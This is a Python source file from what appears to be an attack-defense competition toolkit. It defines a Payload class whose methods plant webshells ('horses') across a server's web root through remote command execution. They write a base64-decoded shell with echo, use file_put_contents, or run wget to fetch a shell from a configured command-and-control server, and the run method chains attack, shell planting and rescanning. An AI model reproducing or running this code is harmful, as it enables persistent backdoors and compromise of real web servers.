import sys
sys.path.append('..')
import logging
from modules.trash.trash import Trash
from modules.monitor.monitor import SMonitor
from configuration import configuration as config
from collections import namedtuple
from modules.execute import execute_command,ExecuteFailException
from modules.write import write_local,WriteFailException
from utils import Utils
from models.horse import Horse
import requests

MonitorConf = namedtuple('MonitorConf','headers targets shellLocations')

class PayloadFailException(Exception):
    '''raised when payload fail,especially in attack func'''

class Payload:
    def __init__(self,host,mode='attack'):
        self.host = host
        uris = config.sitemap
        self.trash = Trash(host,uris)
        self.mode = mode
        if self.mode == 'attack':
            self.monitor = SMonitor(host,config.shellLocations)
            self.shell = self.monitor.scan()

    def attack(self):
        '''this method attack a host,and uplaod a horse and return shell path and the key if succeed
            or raise PayloadFailException if fail
        '''
        pass

    def execute(self):
        pass

    def preAttack(self):
        self.trash.start()
        
    def postAttack(self):
        self.trash.start()
        

    def horseAll_ECHO(self,shell=None,key=None):
        # horse all shelllocations
        horse = Horse(self.host)
        for location in config.shellLocations:
            try:
                path = config.webRoot+location
                cmd = "echo {} | base64 -d > {}".format(Utils.base64(horse.default), path)
                execute_command(shell, key, cmd, config.phpFunction)
            except:
                logging.info("echo to file {} failed.".format(path))

    def horseAll_PUTCONTENTS(self,shell=None,key=None):
        horse = Horse(self.host)
        for location in config.shellLocations:
            try:
                path = config.webRoot+location
                contents = horse.default
                write_local(shell,key,path,contents)
            except:
                logging.info("file_put_contents to file {} failed.".format(path))

    def horseAll_Wget(self,shell,key):
        for location in config.shellLocations:
            params = {
                "loc": config.webRoot+location,
                "address": config.ccServer["address"],
                "port": config.ccServer["port"],
                "type": config.defaultHorse,
                "cmd": "test",
                "file": "index.php"
            }
            cmd = "wget -O %(loc)s http://%(address)s:%(port)d/%(type)s/%(cmd)s/%(file)s" % params
            try:
                execute_command(shell,key,cmd,config.phpFunction)
            except:
                pass

    def run(self,test=False):
        if self.mode == 'attack':
            if self.shell and not test:
                return self.shell
            try:
                self.preAttack()
                shellPath,key = self.attack()
                self.horseAll_ECHO(shellPath, key)
                self.shell = self.monitor.scan()
                self.shell.append(shellPath)
                return self.shell
            except:
                raise
            finally:
                self.postAttack()
        elif self.mode == 'execute':
            try:
                self.preAttack()
                res = self.execute()
                return res
            except:
                raise
            finally:
                self.postAttack()


                    
        

